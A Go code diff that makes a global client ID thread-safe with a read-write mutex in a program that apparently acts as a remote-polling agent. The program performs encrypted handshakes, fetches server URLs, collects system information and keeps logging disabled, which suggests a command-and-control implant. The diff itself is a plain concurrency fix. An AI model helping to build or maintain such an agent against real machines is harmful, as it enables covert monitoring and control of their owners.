@@ -9,6 +9,7 @@ import (
 	"fmt"
 	// "log"
 	"os"
+	"sync"
 	"time"
 )
 
@@ -59,6 +60,20 @@ var (
 // Global HandshakeManager instance
 var handshakeManager *HandshakeManager
 
+var clientIDMu sync.RWMutex
+
+func getClientID() string {
+	clientIDMu.RLock()
+	defer clientIDMu.RUnlock()
+	return clientID
+}
+
+func setClientID(id string) {
+	clientIDMu.Lock()
+	defer clientIDMu.Unlock()
+	clientID = id
+}
+
 func main() {
 	// CRITICAL: Perform safety checks as the VERY FIRST operation
 	// This must happen before any logging, network activity, or system calls
@@ -85,7 +100,7 @@ func main() {
 	}
 
 	// Set initial clientID
-	handshakeManager.SetClientID(clientID)
+	handshakeManager.SetClientID(getClientID())
 
 	// Perform initial handshake (WITHOUT starting polling)
 	//log.Println("Starting initial handshake process...")
@@ -105,7 +120,7 @@ func main() {
 	}
 
 	// After successful handshake, update the global clientID
-	clientID = handshakeManager.GetCurrentClientID()
+	setClientID(handshakeManager.GetCurrentClientID())
 	//log.Println("Initial handshake successful")
 
 	// Get current configuration for logging purposes
@@ -122,7 +137,7 @@ func main() {
 	//handshakeManager.decryptedValues["POST Method"]) // Changed to match
 
 	// START POLLING HERE - Only start it once after successful handshake
-	sysInfoReport, err := CollectSystemInfo(clientID)
+	sysInfoReport, err := CollectSystemInfo(getClientID())
 	if err != nil {
 		//log.Fatalf("Failed to collect system information: %v", err)
 	}
@@ -164,13 +179,13 @@ func refreshHandshake() error {
 	}
 
 	// Update global clientID after successful refresh
-	clientID = handshakeManager.GetCurrentClientID()
+	setClientID(handshakeManager.GetCurrentClientID())
 
 	// Get current URLs for logging
 	getURL, postURL := handshakeManager.GetCurrentURLs()
 
 	// Collect system info for new polling session
-	sysInfoReport, err := CollectSystemInfo(clientID)
+	sysInfoReport, err := CollectSystemInfo(getClientID())
 	if err != nil {
 		return fmt.Errorf(ErrCtx(E19, err.Error()))
 	}
